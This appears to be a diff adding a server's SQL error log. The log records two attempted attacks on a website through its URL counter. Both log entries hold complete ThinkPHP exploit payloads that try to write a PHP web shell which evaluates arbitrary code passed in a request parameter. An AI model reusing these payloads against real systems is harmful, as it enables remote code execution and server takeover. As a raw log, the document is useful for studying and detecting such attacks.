@@ -1,0 +1,7 @@
+Time : 23:34:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '404']);?>xise404', cu_hit=1, cu_uptime=unix_timestamp()' at line 1
+Raw SQL : insert into df_counter_url set cu_code='', cu_pm='P', cu_url='http://www.meet-roborock.com?s=index/\think\template\driver\file/write&cacheFile=^ÎÄ¼þÃû^&content=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval("/*ZG5zknRfSk*/".$H7mu6.""); }}new GaM10fA5($_REQUEST['404']);?>xise404', cu_hit=1, cu_uptime=unix_timestamp()
+
+Time : 23:34:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'tt.php','<?php class GaM10fA5 { public function __construct($H7mu6){ @eval("/*ZG' at line 1
+Raw SQL : insert into df_counter_url set cu_code='', cu_pm='P', cu_url='http://www.meet-roborock.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('tt.php','<?php class GaM10fA5 { public function __construct($H7mu6){ @eval("/*ZG5zknRfSk*/".$H7mu6.""); }}new GaM10fA5($_REQUEST['123']);?>')</p', cu_hit=1, cu_uptime=unix_timestamp()
